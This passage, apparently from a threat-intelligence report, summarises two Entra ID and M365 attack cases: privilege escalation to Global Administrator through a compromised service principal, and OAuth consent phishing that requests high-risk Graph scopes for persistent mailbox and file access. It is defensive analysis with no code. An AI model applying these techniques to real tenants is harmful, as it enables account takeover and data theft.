- **Technique Status:** Attackers compromised a certificate for a service principal holding `AppRoleAssignment.ReadWrite.All` and escalated to Global Administrator by chaining additional Graph permissions.
- **Impact:** Full control over Entra ID directory roles and ability to reset admin passwords, modify Conditional Access, and access sensitive data through Graph.
- **Reference:** Semperis – *Exploiting App-Only Graph Permissions in Entra ID*.

#### Example 2: Illicit OAuth Consent with High‑Risk Scopes
- **Target:** Multiple organizations using M365.
- **Timeline:** Ongoing campaigns through 2023–2026.
- **Technique Status:** Attackers registered malicious multi‑tenant apps requesting `Mail.ReadWrite`, `Files.Read.All`, and `offline_access`. Users were lured to consent screens through phishing emails.
- **Impact:** Persistent access to mailboxes and files even after password resets; stealthy data exfiltration over Graph with limited traditional sign‑in signals.
- **Reference:** Microsoft – *Detect and remediate illicit consent grants*; community research on OAuth consent phishing and app governance.

---